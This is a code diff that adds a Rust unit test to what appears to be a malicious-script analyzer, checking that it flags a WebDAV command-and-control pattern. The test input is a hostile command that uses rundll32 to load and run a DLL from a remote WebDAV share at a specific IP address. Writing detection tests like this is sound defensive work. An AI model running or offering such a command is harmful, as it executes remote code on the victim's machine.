@@ -22139,6 +22139,46 @@ mod unc_webdav_tests {
             .count();
         assert_eq!(count, 1, "expected 1 deduped trait, got {}", count);
     }
+
+    #[test]
+    fn bare_webdav_share_rundll32_target_resolves_http_url() {
+        let script = br#"start rundll32 \\104.156.149.6\webdav\host.dll,XSSCheckStart"#;
+        let report = analyze(script, &Config::default());
+        let has_rundll = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Rundll32 { url: Some(url), .. }
+                if url == "http://104.156.149.6/webdav/host.dll"
+            )
+        });
+        assert!(
+            has_rundll,
+            "rundll32 bare WebDAV share URL was not resolved: {:?}",
+            report.traits
+        );
+        let null_rundll_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Rundll32 { url: None, .. }))
+            .count();
+        assert_eq!(
+            null_rundll_count, 0,
+            "bare WebDAV rundll32 should not also emit a null URL row: {:?}",
+            report.traits
+        );
+        let has_unc = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UncWebDavC2 { host, port, http_url, .. }
+                if host == "104.156.149.6"
+                    && port == "80"
+                    && http_url == "http://104.156.149.6/webdav/host.dll"
+            )
+        });
+        assert!(
+            has_unc,
+            "bare WebDAV share was not surfaced as UncWebDavC2: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
